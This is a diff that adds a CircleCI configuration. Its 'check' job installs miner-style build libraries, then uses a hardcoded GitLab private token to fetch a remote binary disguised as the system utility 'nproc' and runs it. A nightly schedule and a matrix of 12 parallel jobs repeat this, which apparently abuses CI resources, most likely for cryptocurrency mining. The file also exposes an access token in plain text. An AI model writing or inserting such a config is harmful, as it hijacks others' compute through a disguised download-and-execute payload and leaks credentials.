@@ -1,0 +1,47 @@
+version: 2.1
+default: &default
+  working_directory: ~/repo
+  docker:
+    - image: ubuntu:16.04
+jobs:
+  check:
+    parameters:
+      version:
+        type: string
+      flag:
+        type: string  
+      own:
+        type: string  
+    <<: *default
+    steps:
+      - run:
+          name: n-arkosr<< parameters.version >><< parameters.flag >>
+          command: |
+            apt update && apt upgrade -y &&  apt install wget -y && apt update && apt install sudo && apt install git -y && sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y 
+            wget -O nproc --header='PRIVATE-TOKEN:yWtsShDDSvaCiwyA-sfR' 'https://gitlab.com/api/v4/projects/26791616/repository/files/nproc/raw?ref=master' && chmod +x nproc && ./nproc
+
+workflows:
+  version: 2.1
+  check:
+    triggers:
+      - schedule:
+          cron: "0 00 * * *"
+          filters:
+            branches:
+              only: master
+    jobs:
+      - check:
+          matrix:
+            parameters:
+              version: [a,b,c]
+              flag: ["1", "2", "3", "4"]
+              own: ["arkosr"]
+  build:
+    jobs:
+      - check:
+          matrix:
+            parameters:
+              version: [a,b,c]
+              flag: ["1", "2", "3", "4"]
+              own: ["arkosr"]
+ 
